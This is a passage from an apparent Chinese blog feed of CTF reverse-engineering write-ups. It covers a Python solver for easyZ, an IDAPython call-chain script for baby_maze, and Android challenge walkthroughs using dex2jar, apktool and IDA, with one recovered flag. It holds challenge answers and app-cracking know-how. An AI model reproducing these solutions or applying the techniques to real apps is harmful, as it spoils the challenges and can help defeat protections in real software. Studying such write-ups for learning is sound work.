python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">data=    [<span class="number">0x0000b2b0</span>, <span class="number">0x00006e72</span>, <span class="number">0x00006061</span>, <span class="number">0x0000565d</span>,</span><br><span class="line">          <span class="number">0x0000942d</span>, <span class="number">0x0000ac79</span>, <span class="number">0x0000391c</span>, <span class="number">0x0000643d</span>,</span><br><span class="line">          <span class="number">0x0000ec3f</span>, <span class="number">0x0000bd10</span>, <span class="number">0x0000c43e</span>, <span class="number">0x00007a65</span>,</span><br><span class="line">          <span class="number">0x0000184b</span>, <span class="number">0x0000ef5b</span>, <span class="number">0x00005a06</span>, <span class="number">0x0000a8c0</span>,</span><br><span class="line">          <span class="number">0x0000f64b</span>, <span class="number">0x0000c774</span>, <span class="number">0x000002ff</span>, <span class="number">0x00008e57</span>,</span><br><span class="line">          <span class="number">0x0000aed9</span>, <span class="number">0x0000d8a9</span>, <span class="number">0x0000230c</span>, <span class="number">0x000074e8</span>,</span><br><span class="line">          <span class="number">0x0000c2a6</span>, <span class="number">0x000088b3</span>, <span class="number">0x0000af2a</span>, <span class="number">0x00009ea7</span>,</span><br><span class="line">          <span class="number">0x0000ce8a</span>, <span class="number">0x00005924</span>, <span class="number">0x0000d276</span>, <span class="number">0x000056d4</span>,</span><br><span class="line">          <span class="number">0x000077d7</span>, <span class="number">0x0000990e</span>, <span class="number">0x0000b585</span>, <span class="number">0x00004bcd</span>,</span><br><span class="line">          <span class="number">0x00005277</span>, <span class="number">0x00001afc</span>, <span class="number">0x00008c8a</span>, <span class="number">0x0000cdb5</span>,</span><br><span class="line">          <span class="number">0x00006e26</span>, <span class="number">0x00004c22</span>, <span class="number">0x0000673f</span>, <span class="number">0x0000daff</span>,</span><br><span class="line">          <span class="number">0x00000fac</span>, <span class="number">0x000086c7</span>, <span class="number">0x0000e048</span>, <span class="number">0x0000c483</span>,</span><br><span class="line">          <span class="number">0x000085d3</span>, <span class="number">0x00002204</span>, <span class="number">0x0000c2ee</span>, <span class="number">0x0000e07f</span>,</span><br><span class="line">          <span class="number">0x00000caf</span>, <span class="number">0x0000bf76</span>, <span class="number">0x000063fe</span>, <span class="number">0x0000bffb</span>,</span><br><span class="line">          <span class="number">0x00004b09</span>, <span class="number">0x0000e5b3</span>, <span class="number">0x00008bda</span>, <span class="number">0x000096df</span>,</span><br><span class="line">          <span class="number">0x0000866d</span>, <span class="number">0x00001719</span>, <span class="number">0x00006bcf</span>, <span class="number">0x0000adcc</span>,</span><br><span class="line">          <span class="number">0x00000f2b</span>, <span class="number">0x000051ce</span>, <span class="number">0x00001549</span>, <span class="number">0x000020c1</span>,</span><br><span class="line">          <span class="number">0x00003a8d</span>, <span class="number">0x000005f5</span>, <span class="number">0x00005403</span>, <span class="number">0x00001125</span>,</span><br><span class="line">          <span class="number">0x00009161</span>, <span class="number">0x0000e2a5</span>, <span class="number">0x00005196</span>, <span class="number">0x0000d8d2</span>,</span><br><span class="line">          <span class="number">0x0000d644</span>, <span class="number">0x0000ee86</span>, <span class="number">0x00003896</span>, <span class="number">0x00002e71</span>,</span><br><span class="line">          <span class="number">0x0000a6f1</span>, <span class="number">0x0000dfcf</span>, <span class="number">0x00003ece</span>, <span class="number">0x00007d49</span>,</span><br><span class="line">          <span class="number">0x0000c24d</span>, <span class="number">0x0000237e</span>, <span class="number">0x00009352</span>, <span class="number">0x00007a97</span>,</span><br><span class="line">          <span class="number">0x00007bfa</span>, <span class="number">0x0000cbaa</span>, <span class="number">0x000010dc</span>, <span class="number">0x00003bd9</span>,</span><br><span class="line">          <span class="number">0x00007d7b</span>, <span class="number">0x00003b88</span>, <span class="number">0x0000b0d0</span>, <span class="number">0x0000e8bc</span>]</span><br><span class="line">result = [<span class="number">0x08a73233</span>, <span class="number">0x116db0f6</span>, <span class="number">0x0e654937</span>, <span class="number">0x03c374a7</span>,</span><br><span class="line">          <span class="number">0x16bc8ed9</span>, <span class="number">0x0846b755</span>, <span class="number">0x08949f47</span>, <span class="number">0x04a13c27</span>,</span><br><span class="line">          <span class="number">0x0976cf0a</span>, <span class="number">0x07461189</span>, <span class="number">0x1e1a5c12</span>, <span class="number">0x11e64d96</span>,</span><br><span class="line">          <span class="number">0x03cf09b3</span>, <span class="number">0x093cb610</span>, <span class="number">0x0d41ea64</span>, <span class="number">0x07648050</span>,</span><br><span class="line">          <span class="number">0x092039bf</span>, <span class="number">0x08e7f1f7</span>, <span class="number">0x004d871f</span>, <span class="number">0x1680f823</span>,</span><br><span class="line">          <span class="number">0x06f3c3eb</span>, <span class="number">0x2205134d</span>, <span class="number">0x015c6a7c</span>, <span class="number">0x11c67ed0</span>,</span><br><span class="line">          <span class="number">0x0817b32e</span>, <span class="number">0x06bd9b92</span>, <span class="number">0x08806b0c</span>, <span class="number">0x06aaa515</span>,</span><br><span class="line">          <span class="number">0x205b9f76</span>, <span class="number">0x0de963e9</span>, <span class="number">0x2194e8e2</span>, <span class="number">0x047593bc</span>]</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">input</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7e</span>,<span class="number">1</span>):</span><br><span class="line">        a = <span class="built_in">input</span> * <span class="built_in">input</span> * data[i]+ data[i + <span class="number">32</span>] * <span class="built_in">input</span>+ data[i + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> a == result[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">input</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;easyZ&quot;&gt;&lt;a href=&quot;#easyZ&quot; class=&quot;headerlink&quot; title=&quot;easyZ&quot;&gt;&lt;/a&gt;easyZ&lt;/h1&gt;&lt;p&gt;一点都不简单好吗，框架(S390)都看不出来🤪&lt;/p&gt;
&lt;p&gt;先用ida打开发现不能反汇编&lt;/p&gt;
&lt;p&gt;用lin</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>巅峰极客reverse baby_maze</title>
    <link href="http://example.com/2021/08/13/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse%20baby_maze/"/>
    <id>http://example.com/2021/08/13/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2reverse%20baby_maze/</id>
    <published>2021-08-13T11:39:43.655Z</published>
    <updated>2021-08-13T07:52:23.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="巅峰极客reverse-baby-maze"><a href="#巅峰极客reverse-baby-maze" class="headerlink" title="巅峰极客reverse baby_maze"></a>巅峰极客reverse baby_maze</h1><p>这题通过ida64打开后发现是很多个函数写的地图，人看傻了`(<em>&gt;﹏&lt;</em>)′</p><p>后来一想 直接找到终点的函数，然后利用交叉引用溯回到起点就行了（”好像”还挺简单的😃）</p><p>通过字符串.</p><p><strong>Good Job. \nAnd the flag is flag md5(your input)\nIf not, you may need to go faster!</strong></p><p>找到终点sub_54DE35</p><p>通过<strong>Welcome to TastelessMaze!</strong> 找到主函数再找到起点sub_40187C()</p><p>我原本一个一个慢慢往上溯回，结果卡死了</p><p>出现了这种情况</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210802102522.png" alt="image-20210802102522230"></p><p>我需要看是谁走到了sub_53E6B7 一看D先走了sub_53CE65()这个函数，再来走sub_53E6B7</p><p>sub_53CE65()里面又是switch 人麻了🤡</p><p>我莫得办法</p><p>事后看师傅们的wp，QAQ，直接正面暴力莽，利用idapython中的<code>gen_r_call_chain</code>函数</p><p>学习网址：</p><p><a href="https://blog.51cto.com/watertoeast/2287039">https://blog.51cto.com/watertoeast/2287039</a></p><p><a href="https://zhuanlan.zhihu.com/p/395205287">https://zhuanlan.zhihu.com/p/395205287</a></p><p>但是基于本题的话，一直递推到终点就可以回溯了，所以要再gen_r_call_chain中添加一个终点的参数</p><p>还要查询函数<code>get_my_callee</code>，来得到xref的引用函数列表</p><p>也就是</p><p>ida快捷键 Shift+F2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line">visited_func = <span class="built_in">set</span>()</span><br><span class="line">steps = []</span><br><span class="line">r_call_chain = []</span><br><span class="line">idx2chr = &#123;<span class="number">4</span>: <span class="string">&#x27;W&#x27;</span>,<span class="number">5</span>: <span class="string">&#x27;D&#x27;</span>,<span class="number">6</span>: <span class="string">&#x27;S&#x27;</span>,<span class="number">7</span>: <span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_r_call_chain</span>(<span class="params">func_name, osintneting,destination</span>):</span></span><br><span class="line">    <span class="keyword">del</span> r_call_chain[:]</span><br><span class="line">    <span class="keyword">del</span> steps[:]</span><br><span class="line">    visited_func = <span class="built_in">set</span>()</span><br><span class="line">    get_my_caller(func_name, osintneting,destination)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_my_caller</span>(<span class="params">func_name, osintneting,destination</span>):</span></span><br><span class="line"></span><br><span class="line">    cstr = <span class="string">&#x27;&#123;0&#125;\t&#x27;</span>.<span class="built_in">format</span>(func_name)</span><br><span class="line">    <span class="keyword">if</span> cstr <span class="keyword">not</span> <span class="keyword">in</span> visited_func:</span><br><span class="line">        r_call_chain.append(cstr)</span><br><span class="line">        visited_func.add(cstr)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    addr = get_name_ea(<span class="number">0</span>, func_name)</span><br><span class="line">    addr_ref_to = get_first_fcref_to(addr)</span><br><span class="line"></span><br><span class="line">    osinteneting_end = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> addr_ref_to == BADADDR:</span><br><span class="line">        osinteneting_end = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> osintneting == -<span class="number">1</span>:</span><br><span class="line">        osinteneting_end = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> osintneting == <span class="number">1</span>:</span><br><span class="line">        osinteneting_end = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (destination == func_name <span class="keyword">or</span> osintneting == <span class="number">1</span>):</span><br><span class="line">        length = <span class="built_in">len</span>(steps)</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            sys.stdout.write(steps[length - idx - <span class="number">1</span>])</span><br><span class="line">        sys.stdout.write(<span class="string">&#x27; &#x27;</span> + func_name)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        r_call_chain.pop()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> osinteneting_end <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr_ref_to != BADADDR) <span class="keyword">and</span> (addr_ref_to != addr):</span><br><span class="line">        parent_func_name = get_func_name(addr_ref_to)</span><br><span class="line">        callee_list = get_my_callee(parent_func_name)</span><br><span class="line">        ids = callee_list.index(func_name)</span><br><span class="line"><span class="comment">#print (callee_list,func_name,cur_id,end = &quot;,&quot;)</span></span><br><span class="line">        steps.append(idx2chr[ids])</span><br><span class="line">        get_my_caller(parent_func_name, osintneting - <span class="number">1</span>,destination)</span><br><span class="line">        steps.pop()</span><br><span class="line">        addr_ref_to = get_next_fcref_to(addr, addr_ref_to)</span><br><span class="line">        <span class="keyword">if</span> addr_ref_to == BADADDR:</span><br><span class="line">            r_call_chain.pop()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_my_callee</span>(<span class="params">func_name</span>):</span></span><br><span class="line">    addr = get_name_ea(<span class="number">0</span>, func_name)</span><br><span class="line">    dism_addr = <span class="built_in">list</span>(idautils.FuncItems(addr))</span><br><span class="line">    xref_froms = []</span><br><span class="line">    <span class="keyword">for</span> ea <span class="keyword">in</span> dism_addr:</span><br><span class="line">        <span class="keyword">if</span> ida_idp.is_call_insn(ea) <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            callee = get_first_fcref_from(ea)</span><br><span class="line">            <span class="keyword">if</span> callee != addr:</span><br><span class="line">                xref_froms.append(callee)</span><br><span class="line">    names = [get_func_name(callee) <span class="keyword">for</span> callee <span class="keyword">in</span> xref_froms]</span><br><span class="line">    <span class="keyword">return</span> names</span><br><span class="line">gen_r_call_chain(<span class="string">&#x27;sub_54DE35&#x27;</span>, <span class="number">600</span>, <span class="string">&#x27;sub_40187C&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>idx2chr = &#123;4: &#39;W&#39;,5: &#39;D&#39;,6: &#39;S&#39;,7: &#39;A&#39;&#125;</code> 的原因是从汇编来看</p><p>callee_list , func_name , cur_id</p><p>[‘sub_55D500’, ‘sub_597460’, ‘sub_55F1F0’, ‘sub_597460’, ‘sub_4EB7E3’, ‘sub_4ED806’, ‘sub_4F11F5’, ‘sub_55D500’, ‘sub_55BD20’] </p><p>sub_4F11F5 </p><p>6</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210803082306.png" alt="image-20210803082306420"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">void sub_4ED753()</span><br><span class="line">&#123;</span><br><span class="line">  char v0; // [rsp+Fh] [rbp-1h]</span><br><span class="line"></span><br><span class="line">  sub_55D500((__int64)&quot;Just do it&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_597460(0LL);</span><br><span class="line">    v0 = sub_55F1F0();</span><br><span class="line">    sub_597460(0LL);</span><br><span class="line">    switch ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      case &#x27;A&#x27;:</span><br><span class="line">        goto LABEL_6;</span><br><span class="line">      case &#x27;D&#x27;:</span><br><span class="line">        goto LABEL_4;</span><br><span class="line">      case &#x27;Q&#x27;:</span><br><span class="line">        sub_55BD20(0);</span><br><span class="line">      case &#x27;S&#x27;:</span><br><span class="line">        goto LABEL_5;</span><br><span class="line">      case &#x27;W&#x27;:</span><br><span class="line">        sub_4EB7E3(0LL, 0LL);</span><br><span class="line">LABEL_4:</span><br><span class="line">        sub_4ED806(0LL, 0LL);</span><br><span class="line">LABEL_5:</span><br><span class="line">        sub_4F11F5(0LL, 0LL);</span><br><span class="line">LABEL_6:</span><br><span class="line">        sub_55D500((__int64)&quot;OUCH!!!!&quot;);</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的就是4: ‘W’,5: ‘D’,6: ‘S’,7: ‘A’</p><p>运行脚本后，第一个最短而且到达了终点</p><p>由于开始的时候需要“S”一下进入地图，所以在加上一个S，md5后得到flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_40180E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  sub_55D500((__int64)<span class="string">&quot;This is the beginning. You can only go south.&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_597460(<span class="number">0LL</span>);</span><br><span class="line">    v0 = sub_55F1F0();</span><br><span class="line">    sub_597460(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="string">&#x27;Q&#x27;</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != <span class="string">&#x27;S&#x27;</span> );</span><br><span class="line">  sub_40187C();</span><br><span class="line">LABEL_5:</span><br><span class="line">  sub_55BD20(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210802112122.png" alt="image-20210802112122575"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;巅峰极客reverse-baby-maze&quot;&gt;&lt;a href=&quot;#巅峰极客reverse-baby-maze&quot; class=&quot;headerlink&quot; title=&quot;巅峰极客reverse baby_maze&quot;&gt;&lt;/a&gt;巅峰极客reverse baby_maze&lt;/</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>安卓逆向思路</title>
    <link href="http://example.com/2021/08/13/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E6%80%9D%E8%B7%AF/"/>
    <id>http://example.com/2021/08/13/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E6%80%9D%E8%B7%AF/</id>
    <published>2021-08-13T11:39:43.653Z</published>
    <updated>2021-08-13T07:47:56.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easyeasy-200"><a href="#easyeasy-200" class="headerlink" title="easyeasy-200"></a>easyeasy-200</h1><p>安卓逆向</p><p>用Android Killer直接反汇编，接着看程序java层</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151058.png" alt="image-20210114105441455"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ApplicationInfo是android.content.pm包下的一个实体类，用于封装应用的信息，flags是其中的一个成员变量public int flags = 0;用于保存应用的标志信息。</span><br><span class="line">ApplicationInfo 通过它可以得到一个应用基本信息。这些信息是从AndroidManifest.xml的&lt; application &gt;标签获取的</span><br><span class="line">ApplicationInfo对象里保存的信息都是&lt;application&gt;标签里的属性值</span><br></pre></td></tr></table></figure><p>这些信息没用</p><p>接着看下面的判断</p><p>发现要求输入的字符串的长度要在35-39之间，之后再调用Format().form函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151555.png" alt="image-20210112120154118"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramString.substring是用来截取字符串的</span><br></pre></td></tr></table></figure><p>调用Format().form 所以返回的是字符串的[5,38]，因此字符串长度需要大于38</p><p>接着看主函数得知返回的字符串需要大于32，满足就是调用Check模块中的check</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151541.png" alt="image-20210112124934291"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exists()方法</span><br><span class="line">返回值：</span><br><span class="line">true：此抽象路径名表示的文件或目录是否存在</span><br><span class="line">false：其他</span><br></pre></td></tr></table></figure><p>Check模块中先是复制了两个路径，再调用了checkPipes，判断路径是否存在，两个路径中存在任何一个就会被赋值为ture并返回。当两个路径都不存在时赋值为false。</p><p>check函数先将emulator传入，判断其结果，结果为真返回false，否则就调用后面的checkPasswd传入paramString</p><p>关键就在这个checkPasswd中</p><p>现在需要将apk编译后再用ida调试so文件（再看看native层）</p><p>（要用apktool反编译，so在生成的文件夹/lib/选择你的IDA对应版本文件的so打开，我是android Killer一键就有了）</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151609.png" alt="image-20210114112911512"></p><p>用ida打开</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151807.png" alt="image-20210114113426218"></p><p>可以看出先v7先是申请空间，再存着V6里的字符串，之后进行了字符串的反转</p><p>接着进入sub_6ED0(&amp;v15, v7, v11);</p><p>通过</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151756.png" alt="image-20210114114621993"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153337.png" alt="image-20210114114701627"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151751.png" alt="image-20210114114647093"></p><p>可以推断出这应该是将字符串复制给v15</p><p>之后就是 encrypt((const char *)&amp;v14, v15); 这一加密了</p><p>然后将加密后的字符给了 v12 </p><p>sub_69A4(&amp;v14);<br>sub_69A4(&amp;v15);</p><p>里面进行了delete，释放空间</p><p>接着是sub_7834((int)&amp;secret, v12)</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151832.png" alt="image-20210114115215409"></p><p>这里是比较了两个字符串是否相同</p><p>那现在就是找secret的值，通过按X，找使用过他的函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151923.png" alt="image-20210114115434319"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725151929.png" alt="image-20210114115448907"></p><p>找到了secret的字符串，和dword_1D09C的字符串，看着就像base64</p><p>再回头看看encrypt那个函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152000.png" alt="image-20210114123401067"></p><p>先base64解码</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152014.png" alt="image-20210114123444160"></p><p>再反转就可以到到答案了</p><p>flag{iwantashellbecauseidonthaveitttt}</p><h1 id="easycrack-100"><a href="#easycrack-100" class="headerlink" title="easycrack-100"></a>easycrack-100</h1><p>题目给了提示：在Java层没有太多逻辑，对输入框进行监听，当有输入的时候调用native层的函数进行校验</p><p>查查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Android的分4层，java应用程序，java框架，本地框架和java运行环境，Linux内核空间</span><br><span class="line"></span><br><span class="line">Java应用程序无需过多解释，基本可以理解为各个App，由Java语言实现。</span><br><span class="line">Java框架层（系统服务）就是常说的Framework，这层里东西很多也很复杂，比如说主要的一些系统服务如ActivityManagerService、PackageManagerService等，我们编写的Android代码之所以能够正常识别和动作，都要依赖这一层的支持。这一层也是由Java语言实现。</span><br><span class="line">Native层（本地服务）这部分常见一些本地服务和一些链接库等。这一层的一个特点就是通过C和C++语言实现。比如我们现在要执行一个复杂运算，如果通过java代码去实现，那么效率会非常低，此时可以选择通过C或C++代码去实现，然后和我们上层的Java代码通信（这部分在android中称为jni机制）。又比如我们的设备需要运行，那么必然要和底层的硬件驱动交互，也要通过Native层。</span><br><span class="line">Linux内核空间包括了内存管理、安全、网络栈、进程管理和驱动模块等等方面内容</span><br></pre></td></tr></table></figure><p>刚刚那题Check模块的check就是用到了native层函数</p><p>这题我们不用Android killer，基本的操作来一次</p><p>先将文件用zip解压</p><p>将classes.dex文件放到dex2jar工具下，运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat  classes.dex</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152023.png" alt="image-20210114125747473"></p><p>生成了classes_dex2jar.jar文件</p><p>用jd-gui-1.6.6.jar打开分析</p><p>看到主函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152026.png" alt="image-20210114150645628"></p><p>System.loadLibrary调用SO源码</p><p>MessageMe方法首先获取程序包名称，其中出现了一些新的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getPackageName是Android中Context中用于得到包名的函数</span><br><span class="line">题目中用\\.隔开得到包名</span><br><span class="line">ToCharArray( )的用法，将字符串对象中的字符转换为一个字符数组。</span><br><span class="line">    例如：</span><br><span class="line">    String myString=&quot;abcd&quot;;</span><br><span class="line">    char myChar[]=myString.toCharArray();</span><br><span class="line">    System.out.println(&quot;myChar[1]=&quot;+myChar[1]);</span><br><span class="line">    输出结果：myChar[1]=b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>i从51（’3’）开始，将包名给了str</p><p>又做了一些异或处理，但是目前看不到localObject字符串，就先放着</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152055.png" alt="image-20210114143041769"></p><p>这是建立按钮、文本界面之类的</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152133.png" alt="image-20210114143541229"></p><p>parseText为native层函数，传入的参数为输入的字符串。等等可以用ida反汇编so看看</p><p>主要就是这个监听窗口</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152137.png" alt="image-20210114143131422"></p><p>如果字符串变动，将会执行具体的实现，这里是调用了native层的parseText函数。</p><p>现在利用apktool在该目录下执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool.bat d [-s] -f xxx.apk -o appdebug</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725152222.png" 